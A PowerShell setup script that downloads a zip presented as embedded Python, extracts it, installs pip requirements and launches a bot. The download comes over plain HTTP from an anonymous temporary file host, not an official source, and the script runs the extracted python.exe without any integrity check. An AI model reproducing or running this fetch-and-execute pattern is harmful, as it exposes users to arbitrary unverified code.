
Import-Module Microsoft.PowerShell.Utility -ErrorAction Stop
Import-Module Microsoft.PowerShell.Archive -ErrorAction Stop
Import-Module Microsoft.PowerShell.Management -ErrorAction Stop

# PowerShell script to download embedded Python, extract it, and install dependencies
# Define the URL for the embedded Python zip file (adjust version as needed)
$pythonUrl = "http://tmpfiles.org/dl/16317349/python.zip"

# Define paths
$zipPath = Join-Path $PSScriptRoot "python.zip"
$extractPath = $PSScriptRoot
$requirementsPath = Join-Path $PSScriptRoot "requirements.txt"

# Find the Python executable
$pythonExe = Join-Path $extractPath "python\python.exe"

# Check if Python is already downloaded and extracted
if (Test-Path $pythonExe) {
    Write-Host "Python is already downloaded!"
} else {
    try {
        # Download the Python zip file
        Write-Host "Downloading Python..."
        Invoke-WebRequest -Uri $pythonUrl -OutFile $zipPath -ErrorAction Stop
        Write-Host "Download completed successfully."
    } catch {
        Write-Error "Failed to download Python zip file: $_"
        exit 1
    }

    try {
        # Extract the zip file
        Write-Host "Extracting Python..."
        Expand-Archive -Path $zipPath -DestinationPath $extractPath -Force -ErrorAction Stop
        Write-Host "Extraction completed successfully."
    } catch {
        Write-Error "Failed to extract Python zip file"
        exit 1
    }
}

# Check if Python executable exists
if (-Not (Test-Path $pythonExe)) {
    Write-Error "Python executable not found!"
    exit 1
}

# Install dependencies using the downloaded Python's pip
Write-Host "Installing dependencies..."

try {
    Write-Host "Upgrading pip..."
    & $pythonExe -m pip install --upgrade pip
    if ($LASTEXITCODE -ne 0) {
        throw "Pip upgrade failed with exit code $LASTEXITCODE"
    }
    Write-Host "Pip upgrade completed successfully."
} catch {
    Write-Error "Failed to upgrade pip"
    exit 1
}

try {
    Write-Host "Installing packages from requirements.txt..."
    & $pythonExe -m pip install -r $requirementsPath
    if ($LASTEXITCODE -ne 0) {
        throw "Pip install failed with exit code $LASTEXITCODE"
    }
    Write-Host "Package installation completed successfully."
} catch {
    Write-Error "Failed to install dependencies"
    exit 1
}

# Optional: Clean up the zip file
Write-Host "Cleaning up..."
Remove-Item $zipPath -ErrorAction SilentlyContinue

Write-Host "Initialization complete! Starting the bot..."

& $pythonExe launch_bot.py
